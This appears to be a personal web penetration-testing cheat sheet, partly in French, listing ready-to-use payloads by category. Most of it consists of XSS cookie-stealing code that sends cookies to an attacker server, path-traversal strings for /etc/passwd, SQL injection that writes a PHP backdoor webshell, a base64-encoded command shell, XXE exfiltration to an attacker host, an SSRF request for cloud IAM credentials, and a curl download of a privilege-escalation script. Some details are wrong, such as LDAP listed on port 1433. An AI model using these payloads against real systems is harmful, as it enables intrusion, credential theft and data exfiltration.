awk -F '[]' '{}'
sed "s/8.8.8.8/1.1.1.1/g" testo > testo2
tcpdump icmp -vn

## Scan
nmap -p- -n -sV -sT -sU -Pn -T5  target

## XSS 
# Simple payload

<script>alert(document.cookie)</script>
<img src=error onerror='alert(document.cookie)'>
<body onload='alert(1)'>
" onload="javascript:alert(3)
" onload='alert(4)'

# Techniques
- Bypass httponly with TRACE
- Steal cookies: python -m SimpleHttpServer 8000, document.write('<img src="http://IP:8000/steal.php?q='+document.cookie+' ">');

## OS/code injection
``
;
&&, &
||
|/bin/ls -al
;system('/usr/bin/id')
<?php system("cat /etc/passwd");?>

## LFI/RFI
../../../../etc/passwd?
../../../../etc/passwd
../../../../../../var/www/dossierexistanthmm/../../../../../etc/passwd
....//....//etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

http://evil.com/shell.txt

.%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
%252e%252e%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd%00

php://filter/read=string.rot13/resource=index.php
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4= (NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>")
data://text/plain,<?php phpinfo(); ?>

## SQLi

# Detection :Error
'
"
`
')
")
`)
'))
"))
`))
# Detection :blind

a' and sleep(2); -- -
a' and 1=1, -- -

And = && 

# bypass auth 
OR 1=1 LIMIT 1; --

# union based exploitation

number of columns: 
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked

# Extract database names, table names and column names

SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges


#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]


union select 1,2,3,4,"<?php echo shell_exec(\$_GET['cmd']);?>",6 into outfile "c:/xampp/htdocs/backdoor.php"

# Exploiting Blind SQLi

https://defendtheweb.net/article/blind-sql-injection

How many tables: 
AND(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2


1' and SUBSTR(user(),1,1) = 'a'
1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables )='A'

# Exploiting Error Blind SQLi
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -


## XXE
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>


<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>

SSRF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

Blind
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;


## Xpath

## CSRF
Samesite: Allowed domain to send cookies from (browser protection)
CORS

## File upload 
pht, phpt, phtml, php3,php4,php5,php6.
Content type : image/png, image/jpeg, image/gif
https://github.com/epinna/weevely3
/usr/share/webshells
PNG header magic number
sleep(10)-- -.jpg
<svg onload=alert(document.comain)>
; sleep 10;


## Broken Authentication
- Politique de mot de passe/verouillage 
- Session fixation (user info as session ID)
- 2FA
- Session renew
- User enumeration : Error msg, time, behavior 
- Reset functionality: X-Forwarded-Host, validity after use

# Broken Access Control
- IDOR
- Incorrect redirection
- Restricted URL/function

# Security Misconfiguration
- Sample app
- Directory listing
- Stack trace, errors


## LPE
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh |

## Interview 

SQL 3306
mssql 1433
LDAP 1433
